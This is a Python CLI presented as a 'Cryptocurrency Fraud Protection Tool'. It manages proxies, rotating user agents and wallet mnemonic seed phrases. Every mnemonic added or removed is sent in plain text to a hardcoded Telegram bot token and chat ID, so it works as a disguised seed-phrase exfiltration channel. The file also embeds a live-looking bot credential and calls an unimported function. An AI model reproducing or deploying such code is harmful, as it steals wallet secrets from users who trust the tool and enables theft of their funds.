import argparse
from user_agent_manager import get_random_user_agent, add_user_agent, list_user_agents
from proxies import add_proxy, remove_proxy, list_proxies, get_random_proxy
from mnemonics import add_mnemonic, remove_mnemonic, list_mnemonics
from report import log_activity, send_report_to_telegram
import threading
import time

# Replace with your actual bot token and chat ID
BOT_TOKEN = '7147301992:AAGvyk8lQ6uOj9uyRzdStokZTU4UfgETpNY'
CHAT_ID = '6067013209'

def run_background_task():
    try:
        time.sleep(5)  # Simulate a long operation
        message = "Background task completed!"
        log_activity(message)
        send_report_to_telegram(BOT_TOKEN, CHAT_ID, message)
    except Exception as e:
        log_activity(f"Error in background task: {e}")
        send_report_to_telegram(BOT_TOKEN, CHAT_ID, f"Error in background task: {e}")

def run_cli():
    parser = argparse.ArgumentParser(description="CLI for Cryptocurrency Fraud Protection Tool")
    subparsers = parser.add_subparsers(dest='command')

    # Subparser for user agents
    user_agent_parser = subparsers.add_parser('useragent', help='Manage user agents')
    user_agent_parser.add_argument('action', choices=['add', 'remove', 'list', 'random'], help='Action to perform')
    user_agent_parser.add_argument('--value', help='Value for add or remove action')

    # Subparser for proxies
    proxy_parser = subparsers.add_parser('proxy', help='Manage proxies')
    proxy_parser.add_argument('action', choices=['add', 'remove', 'list', 'random'], help='Action to perform')
    proxy_parser.add_argument('--ip', help='IP address for add action')
    proxy_parser.add_argument('--port', help='Port for add action')
    proxy_parser.add_argument('--type', choices=['HTTP', 'HTTPS', 'SOCKS4', 'SOCKS5'], help='Type for add action')

    # Subparser for mnemonics
    mnemonic_parser = subparsers.add_parser('mnemonic', help='Manage mnemonics')
    mnemonic_parser.add_argument('action', choices=['add', 'remove', 'list'], help='Action to perform')
    mnemonic_parser.add_argument('--value', help='Value for add or remove action')

    # Subparser for starting the background task
    background_parser = subparsers.add_parser('start', help='Start the background task')

    args = parser.parse_args()

    if args.command == 'useragent':
        if args.action == 'add':
            if args.value:
                add_user_agent(args.value)
                log_activity(f"User Agent added: {args.value}")
                send_report_to_telegram(BOT_TOKEN, CHAT_ID, f"User Agent added: {args.value}")
            else:
                print("Error: --value is required for add action")
        elif args.action == 'remove':
            if args.value:
                remove_user_agent(args.value)
                log_activity(f"User Agent removed: {args.value}")
                send_report_to_telegram(BOT_TOKEN, CHAT_ID, f"User Agent removed: {args.value}")
            else:
                print("Error: --value is required for remove action")
        elif args.action == 'list':
            for ua in list_user_agents():
                print(ua)
        elif args.action == 'random':
            print(get_random_user_agent())

    elif args.command == 'proxy':
        if args.action == 'add':
            if args.ip and args.port and args.type:
                add_proxy(args.ip, args.port, args.type)
                log_activity(f"Proxy added: {args.ip}:{args.port} ({args.type})")
                send_report_to_telegram(BOT_TOKEN, CHAT_ID, f"Proxy added: {args.ip}:{args.port} ({args.type})")
            else:
                print("Error: --ip, --port, and --type are required for add action")
        elif args.action == 'remove':
            if args.ip and args.port and args.type:
                proxy = f"{args.ip}:{args.port} ({args.type})"
                remove_proxy(proxy)
                log_activity(f"Proxy removed: {proxy}")
                send_report_to_telegram(BOT_TOKEN, CHAT_ID, f"Proxy removed: {proxy}")
            else:
                print("Error: --ip, --port, and --type are required for remove action")
        elif args.action == 'list':
            for proxy in list_proxies():
                print(proxy)
        elif args.action == 'random':
            print(get_random_proxy())

    elif args.command == 'mnemonic':
        if args.action == 'add':
            if args.value:
                add_mnemonic(args.value)
                log_activity(f"Mnemonic added: {args.value}")
                send_report_to_telegram(BOT_TOKEN, CHAT_ID, f"Mnemonic added: {args.value}")
            else:
                print("Error: --value is required for add action")
        elif args.action == 'remove':
            if args.value:
                remove_mnemonic(args.value)
                log_activity(f"Mnemonic removed: {args.value}")
                send_report_to_telegram(BOT_TOKEN, CHAT_ID, f"Mnemonic removed: {args.value}")
            else:
                print("Error: --value is required for remove action")
        elif args.action == 'list':
            for mnemonic in list_mnemonics():
                print(mnemonic)

    elif args.command == 'start':
        threading.Thread(target=run_background_task).start()

if __name__ == '__main__':
    run_cli()
